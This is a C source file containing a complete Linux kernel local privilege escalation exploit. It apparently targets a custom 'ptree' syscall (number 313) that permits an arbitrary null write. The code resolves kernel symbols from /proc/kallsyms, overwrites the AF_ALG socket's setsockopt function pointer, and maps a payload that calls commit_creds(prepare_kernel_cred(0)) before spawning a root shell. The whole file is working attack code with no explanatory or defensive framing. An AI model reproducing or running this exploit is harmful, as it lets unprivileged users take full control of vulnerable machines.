#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <sys/socket.h>

#define __NR_ptree 313

struct prinfo {
        long state;
        pid_t pid;
        pid_t parent_pid;
        pid_t first_child_pid;
        pid_t next_sibling_pid;
        long uid;
        char comm[64];
};

static inline int ptree(struct prinfo *processes, unsigned int *count)
{
        return syscall(__NR_ptree, processes, count);
}

/* thanks spender... */
unsigned long get_kernel_sym(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	struct utsname ver;
	int ret;
	int rep = 0;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) 
		goto fallback;

repeat:
	ret = 0;
	while(ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			printf("[+] Resolved %s to %p%s.\n", name, (void *)addr, rep ? " (via System.map)" : "");
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	if (rep)
		return 0;

fallback:
	uname(&ver);
	sprintf(sname, "/boot/System.map-%s", ver.release);
	f = fopen(sname, "r");
	if (f == NULL)
		return 0;
	rep = 1;
	goto repeat;
}

typedef int (* _commit_creds)(unsigned long cred);
typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);

int get_root(void *sock, int level, int optname, void *optval, unsigned int optlen)
{
	unsigned long *pointers = (unsigned long *)optval;
	_commit_creds commit_creds = (_commit_creds)pointers[0];
	_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)pointers[1];
	int *got_root = (int *)pointers[2];
	commit_creds(prepare_kernel_cred(0));
	*got_root = 1;
	return -1;
}
int after_get_root(void *sock, int level, int optname, void *optval, unsigned int optlen) { }

struct proto_ops {
	int family;
	void *owner;
	void *release;
	void *bind;
	void *connect;
	void *socketpair;
	void *accept;
	void *getname;
	void *poll;
	void *ioctl;
	void *compat_ioctl;
	void *listen;
	void *shutdown;
	void *setsockopt;
};

int main(int argc, char *argv[])
{
	int sock, got_root;
	unsigned long alg_proto_ops, alg_setsockopt, commit_creds, prepare_kernel_cred;
	unsigned long target, top_half, landing;
	void *payload;

	alg_proto_ops = get_kernel_sym("alg_proto_ops");
	alg_setsockopt = get_kernel_sym("alg_setsockopt");
	commit_creds = get_kernel_sym("commit_creds");
	prepare_kernel_cred = get_kernel_sym("prepare_kernel_cred");

	if (!alg_proto_ops || !alg_setsockopt || !commit_creds || !prepare_kernel_cred) {
		printf("[-] Failed to resolve all kernel symbols.\n");
		return EXIT_FAILURE;
	}

	/* The setsockops pointer in the proto_ops */
	target = alg_proto_ops + (unsigned long)&(((struct proto_ops *)0)->setsockopt);
	printf("[+] Calculated function pointer target to be at %p.\n", (void *)target);

	/* We want to write a null int into the bigger half of the long address */
	top_half = target + sizeof(unsigned int);
	printf("[+] Calculated top half of such function pointer to be at %p.\n", (void *)top_half);

	/* Clear the top sizeof(unsigned int) bits of the result of the null write */
	landing = alg_setsockopt << (2 << sizeof(unsigned int)) >> (2 << sizeof(unsigned int));
	printf("[+] Calculated that writing the null byte will produce the value %p.\n", (void*)landing);


	printf("[+] Mmaping landing and copying in payload.\n");

	/* We mmap the region, rounding down to the nearest page. */
	if (mmap((void *)(landing & ~0xfff), 2 * 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) == (void *)-1) {
		perror("[-] Failed to mmap() landing spot");
		return EXIT_FAILURE;
	}
	if (!memcpy((void *)landing, &get_root, &after_get_root - &get_root)) {
		perror("[-] Couldn't copy payload");
		return EXIT_FAILURE;
	}

	printf("[+] Triggering vulnerable syscall.\n");
	ptree(NULL, (unsigned int *)top_half);
	
	printf("[+] Triggering rogue function pointer.\n");
	sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (sock < 0) {
		perror("[-] Failed to make crypto socket");
		return EXIT_FAILURE;
	}
	got_root = 0;
	unsigned long pointers[] = { commit_creds, prepare_kernel_cred, (unsigned long)&got_root };
	setsockopt(sock, 0, 0, pointers, 0);

	if (!got_root) {
		printf("[-] Failed to get root.\n");
		return EXIT_FAILURE;
	}

	printf("[+] Launching root shell.\n");
	setuid(0);
	setgid(0);
	execl("/bin/sh", "sh", NULL);
}
